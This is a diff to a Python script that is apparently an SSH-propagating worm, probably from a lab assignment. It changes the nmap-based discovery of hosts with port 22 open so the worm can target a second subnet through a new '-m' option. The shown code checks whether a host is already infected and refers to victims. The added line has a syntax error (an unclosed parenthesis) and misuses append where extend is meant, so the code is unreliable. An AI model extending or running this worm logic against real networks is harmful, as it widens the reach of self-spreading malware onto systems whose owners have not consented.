@@ -116,7 +116,7 @@ def getMyIP(interface):
 # Returns the list of systems on the same network
 # @return - a list of IP addresses on the same network
 #######################################################
-def getHostsOnTheSameNetwork():
+def getHostsOnTheSameNetwork(network):
 	import nmap
 	# Create an instance of the port scanner class
 	portScanner = nmap.PortScanner()
@@ -124,7 +124,7 @@ def getHostsOnTheSameNetwork():
 	# Scan the network for systems whose
 	# port 22 is open (that is, there is possibly
 	# SSH running there).
-	portScanner.scan('10.20.22.0/25', arguments='-p 22 --open')
+	portScanner.scan(network, arguments='-p 22 --open')
 
 	# Scan the network for hosts
 	hostInfo = portScanner.all_hosts()
@@ -176,12 +176,17 @@ def getifip():
 
 if len(sys.argv) < 3:
 	
-	# TODO: If we are running on the victim, check if 
-	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice. 
 	clean = False
-	if sys.argv[1] in ('-c', '--clean'):
-		clean = True
+	multiple = False
+	if len(sys.argv) == 2:
+		if sys.argv[1] in ('-c', '--clean'):
+			clean = True
+		elif sys.argv[1] in ('-m', '--multiple'):
+			multiple = True
+		else:
+			print("Invalid argument")
+			sys.exit()
+
 	if isInfectedSystem():
 		sys.exit()
 	else:
@@ -191,7 +196,12 @@ if len(sys.argv) < 3:
 		#Get the IP of the current system
 		ip = getifip()
 		#Get the hosts on the same network
-		networkHosts = getHostsOnTheSameNetwork()
+		network = "10.20.22.0/25"
+		networkHosts = getHostsOnTheSameNetwork(network)
+
+		#If option -m selected
+		if multiple:
+			networkHosts.append(getHostsOnTheSameNetwork("10.20.22.128/25")
 
 		#Remove the IP of the current system
 		#from the list of discovered systems (We do not want to target ourselves!).
